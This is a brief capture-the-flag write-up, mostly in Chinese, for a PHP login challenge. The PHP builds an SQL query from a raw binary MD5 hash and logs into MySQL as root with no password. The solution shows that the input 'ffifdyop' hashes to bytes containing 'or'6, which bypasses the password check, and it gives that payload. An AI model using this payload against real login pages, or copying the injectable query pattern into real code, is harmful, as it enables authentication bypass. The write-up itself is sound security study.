# Challenge 
```php
<?php 
    
error_reporting(0);

$link = mysql_connect('localhost', 'root', '');
if (!$link) { 
    die('Could not connect to MySQL: ' . mysql_error()); 
} 

// 选择数据库
$db = mysql_select_db("test", $link);
if(!$db)
{
    echo 'select db error';
    exit();
}

// 执行sql
$password = $_GET['pwd'];
$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
var_dump($sql);
$result=mysql_query($sql) or die('<pre>' . mysql_error() . '</pre>' );

$row1 = mysql_fetch_row($result);
var_dump($row1);

mysql_close($link);

?>
```

# Solution
sql语句为`"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"`

若md5后的hex转换成字符串后，如果包含`'or'<trash>`这样的字符串，`<trash>`的意思是垃圾值/可忽略

则拼接后构成的语句为：
```
SELECT * FROM admin WHERE pass = ''or'<trash>' 
```

而字符串ffifdyop，md5后，276f722736c95d99e921722cf9ed621c，再转成字符串：`'or'6<trash>`，

拼接后的语句为：
```
SELECT * FROM admin WHERE pass = ''or'6<trash>'
```
成功注入。

payload:
```
?pwd=ffifdyop
```
# Refference 
+ [SQL injection with raw MD5 hashes](https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html)
+ [jarvisoj : Login](http://web.jarvisoj.com:32772/)
+ [chybeta : Login](https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#Login)